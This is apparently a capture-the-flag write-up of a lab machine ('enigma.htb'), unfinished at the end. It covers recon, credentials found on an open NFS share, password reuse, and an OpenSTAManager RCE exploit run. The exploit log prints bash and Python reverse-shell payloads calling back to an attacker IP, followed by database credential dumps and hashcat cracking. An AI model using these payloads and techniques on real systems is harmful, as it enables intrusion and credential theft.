our initial scan


```bash
════════════════════════════════════════════════════════                                                                                                  
  RECON SUMMARY                                                                                                                                             
  ════════════════════════════════════════════════════════                                                                                                  
                                                                                                                                                            
  Target:        10.129.239.191
  DNS:           enigma.htb
  HTTP:          80
  HTTPS:         none
  Generated:     2026-07-13 13:50:35

  ────────────────────────────────────────────────────────
  OPEN PORTS & SERVICES
  ────────────────────────────────────────────────────────
  PORT         STATE      SERVICE          VERSION
  ────────────────────────────────────────────────────────
  22/tcp       open       ssh              OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
  80/tcp       open       http             nginx 1.24.0 (Ubuntu)
  110/tcp      open       pop3             Dovecot pop3d
  111/tcp      open       rpcbind          2-4 (RPC #100000)
  143/tcp      open       imap             Dovecot imapd (Ubuntu)
  993/tcp      open       ssl/imap         Dovecot imapd (Ubuntu)
  995/tcp      open       ssl/pop3         Dovecot pop3d
  2049/tcp     open       nfs              3-4 (RPC #100003)
  33771/tcp    open       mountd           1-3 (RPC #100005)
  34373/tcp    open       mountd           1-3 (RPC #100005)
  42083/tcp    open       mountd           1-3 (RPC #100005)
  43807/tcp    open       nlockmgr         1-4 (RPC #100021)
  53581/tcp    open       status           1 (RPC #100024)

  ────────────────────────────────────────────────────────
  SUBDOMAINS  (1 found)
  ────────────────────────────────────────────────────────
  → mail001.enigma.htb

  ────────────────────────────────────────────────────────
  INTERESTING PATHS  (4 found)
  ────────────────────────────────────────────────────────

  [ http://enigma.htb ]
  STATUS   PATH
  ──────────────────────────────────────────────────
  200      /

  [ http://mail001.enigma.htb ]
  STATUS   PATH
  ──────────────────────────────────────────────────
  301      /plugins
  301      /program
  301      /skins

  ════════════════════════════════════════════════════════

=== Done! Results: /home/kali/github/ctf_tool/results/enigma.htb/ ===
```

Ok so we got loads of open ports. and a subdomain "mail001" lets check the website first. there wasnt much so we checked the subdomain.
There was a roundcube login screen. i used nuclei to find its version

```bash
nuclei -u http://mail001.enigma.htb                                   

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.8.0

                projectdiscovery.io

[WRN] Found 1 templates with runtime error (use -validate flag for further examination)
[INF] Current nuclei version: v3.8.0 (outdated)
[INF] Current nuclei-templates version: v10.4.5 (latest)
[INF] New templates added in latest release: 86
[INF] Templates loaded for current scan: 10447
[WRN] Loading 17 unsigned templates for scan. Use with caution.
[INF] Executing 10430 signed templates from projectdiscovery/nuclei-templates
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 2389 (Reduced 2256 Requests)
[INF] Using Interactsh Server: oast.live
[cookies-without-secure] [javascript] [info] mail001.enigma.htb ["roundcube_sessid"]
[waf-detect:nginxgeneric] [http] [info] http://mail001.enigma.htb
[ssh-server-enumeration] [javascript] [info] mail001.enigma.htb:22 ["SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.16"]
[ssh-sha1-hmac-algo] [javascript] [info] mail001.enigma.htb:22
[ssh-auth-methods] [javascript] [info] mail001.enigma.htb:22 ["["publickey"]"]
[snmpv3-detect] [javascript] [info] mail001.enigma.htb:161 ["Enterprise: unknown"]
[rpc-udp-detect] [javascript] [info] mail001.enigma.htb:111 ["RPC Portmapper UDP Detected"]
[nfs-v3-exposed] [tcp] [info] mail001.enigma.htb:2049
[openssh-detect] [tcp] [info] mail001.enigma.htb:22 ["SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.16"]
[rpcbind-portmapper-detect] [tcp] [info] mail001.enigma.htb:111
[http-missing-security-headers:permissions-policy] [http] [info] http://mail001.enigma.htb
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://mail001.enigma.htb
[http-missing-security-headers:referrer-policy] [http] [info] http://mail001.enigma.htb
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://mail001.enigma.htb
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://mail001.enigma.htb
[http-missing-security-headers:strict-transport-security] [http] [info] http://mail001.enigma.htb
[http-missing-security-headers:content-security-policy] [http] [info] http://mail001.enigma.htb
[http-missing-security-headers:x-content-type-options] [http] [info] http://mail001.enigma.htb
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://mail001.enigma.htb
[nginx-eol:version] [http] [info] http://mail001.enigma.htb ["1.24.0"]
[roundcube-webmail-portal] [http] [info] http://mail001.enigma.htb ["1.6.16"]
[nginx-version] [http] [info] http://mail001.enigma.htb ["nginx/1.24.0"]
[htaccess-config] [http] [info] http://mail001.enigma.htb/.htaccess
[form-detection] [http] [info] http://mail001.enigma.htb
[INF] Skipped mail001.enigma.htb:5814 from target list as found unresponsive permanently: Get "https://mail001.enigma.htb:5814/autopass": c or filtered" address=mail001.enigma.htb:5814 chain="connection refused"
[INF] Skipped mail001.enigma.htb:4040 from target list as found unresponsive permanently: cause="port closed or filtered" address=mail001.eain="connection refused; got err while executing https://mail001.enigma.htb:4040/jobs/?\"'><script>alert(document.domain)</script>"
[missing-cookie-samesite-strict] [http] [info] http://mail001.enigma.htb ["roundcube_sessid=5d0phg45qvf4c3gd0v7hr4pq0u; path=/; HttpOnly"]
[tech-detect:bootstrap] [http] [info] http://mail001.enigma.htb
[tech-detect:nginx] [http] [info] http://mail001.enigma.htb
[INF] Scan completed in 3m. 27 matches found.
```


I didnt find anything of use. lets check the nfs. 

```bash
┌──(kali㉿kali)-[~/github/ctf_tool]
└─$ showmount -e enigma.htb                     
Export list for enigma.htb:
/srv/nfs/onboarding *
                                                                                                                                           
┌──(kali㉿kali)-[~/github/ctf_tool]
└─$ mkdir /tmp/nfs     
                                                                                                                                           
┌──(kali㉿kali)-[~/github/ctf_tool]
└─$ sudo mount -t nfs enigma.htb:/srv/nfs/onboarding /tmp/nfs  
```


There we find a pdf with the following

```bash
Enigma Corp
IT Department - New Employee System Access
Employee:Kevin Mitchell
Department:Operations
Provisioned by:IT Departments
Date:2024-03-01
Webmail Access
URL:http://mail001.enigma.htb
Username:kevin
Password:Enigma2024!
Please change your password upon first login.
For support contact: it@enigma.htb
This document contains confidential internal information intended solely for the recipient.
Unauthorized access, disclosure, or distribution is strictly prohibited.
Generated automatically by Enigma Corp Identity Management System.

```


And we are able to log in. But there is nothing. JUst a gongratzs meesage

I was stuck for a while and decided to try the same pass of "Enigma2024!" on sarah and i was able to log in. 

```bash
Hi Sarah,

Apologies for the delay. I have provisioned your access. Please find the details below:

URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s

Note: I will create a dedicated account for you shortly, for now you can use the admin account to get started.

Regards,
IT Support
Enigma Corp

```

We just add the domain to the /etc/hosts and log in. 

There we can see the version of openStamanager. Lets search a poc for it

```bash
CVE-2026-38751
```

after running it we are able to get a shell.

```bash
./openstamanager-rce-exploit --url http://support_001.enigma.htb/ -U admin -P Ne3s4rtars78s --lhost 10.10.14.11 --lport 4444

[ OpenSTAManager RCE Exploit : ]

Target: http://support_001.enigma.htb/
[*] Step 1: Login...
[+] Login successful: admin
[*] Step 2: Enable updates...
[+] Updates enabled
[*] Step 3: Create ZIP...
[*] Created in-memory ZIP file
[*] Shell location: /modules/shell/shell.php
[*] Step 4: Upload...
[*] Upload status: 500 Internal Server Error
[+] Upload successful
[*] Step 5: Verify...
[+] Vulnerability confirmed!
[+] Shell: http://support_001.enigma.htb/modules/shell/shell.php
[+] Test: http://support_001.enigma.htb/modules/shell/shell.php?c=whoami
[*] Listening on 10.10.14.11:4444...
[*] Trying payload: bash -c 'bash -i >& /dev/tcp/10.10.14.11/4444 0>&1'
[-] Payload failed: error sending request for url (http://support_001.enigma.htb/modules/shell/shell.php?c=bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.11%2F4444+0%3E%261%27): operation timed out
[*] Trying payload: python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.11",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
[-] Payload failed: error sending request for url (http://support_001.enigma.htb/modules/shell/shell.php?c=python3+-c+%27import+socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.14.11%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bsubprocess.call%28%5B%22%2Fbin%2Fbash%22%2C%22-i%22%5D%29%27): operation timed out
[*] Trying payload: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.11",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
[+] Payload sent successfully. Waiting for connection...
[+] Connection received from 10.129.239.191:40744
[*] Sent 'script /dev/null -c bash'

[*]
[*]Reverse shell established.
[*] To get a fully interactive TTY:
[*] 1. Press Ctrl+Z to suspend the shell.
[*] 2. Run: stty raw -echo; fg
[*] 3. When prompted for terminal type, type: xterm
[*] 4. Export: export TERM=xterm SHELL=bash
[*] 5. Adjust rows/columns with: stty rows <rows> columns <cols>
[*]    (Get the size with: stty size)
[*] =============================================
[*] Press Ctrl+C to exit and cleanup the webshell.

bash: cannot set terminal process group (1491): Inappropriate ioctl for device
bash: no job control in this shell
www-data@enigma:~/html/openstamanager/modules/shell$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@enigma:~/html/openstamanager/modules/shell$ 

```


We find db credentials. lets log in

```bash
// Impostazioni di base per l'accesso al database
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
// $port = '|port|';
$db_options = [
    // 'sort_buffer_size' => '2M',
];
```

```bash
mysql> select * from zz_users;
select * from zz_users;
+----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+---------------------+---------------------+-------------+---------------+---------+
| id | username | password                                                     | email            | idanagrafica | idgruppo | enabled | created_at          | updated_at          | reset_token | image_file_id | options |
+----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+---------------------+---------------------+-------------+---------------+---------+
|  1 | admin    | $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu | admin@enigma.htb |            1 |        1 |       1 | 2026-02-18 19:26:52 | 2026-02-18 19:26:52 | NULL        |          NULL |         |
|  2 | haris    | $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC | haris@enigma.htb |            1 |        5 |       1 | 2026-02-18 20:58:28 | 2026-05-26 11:07:03 | NULL        |          NULL |         |
+----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+---------------------+---------------------+-------------+---------------+---------+
2 rows in set (0.00 sec)

```

We got credentials. Lets crack them with hashcat.

```bash
hashcat -m 3200 -a 0 users.txt /usr/share/wordlists/rockyou.txt --username


$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:bestfriends
```

Lets log in to haris.
We got the user.txt and started finding a way to escalate privileges. I didnt find anything but i noticed the OliverTin. Its a tool to access predefned shell commands from a web interface. It has a yaml config which we are able to read. 

In the config we are able to see that we are able to execute actions as a "guest". we can use this to escalate our privileges. 

´´´bash
https://github.com/advisories/GHSA-49gm-hh7w-wfvf
```


to be continued

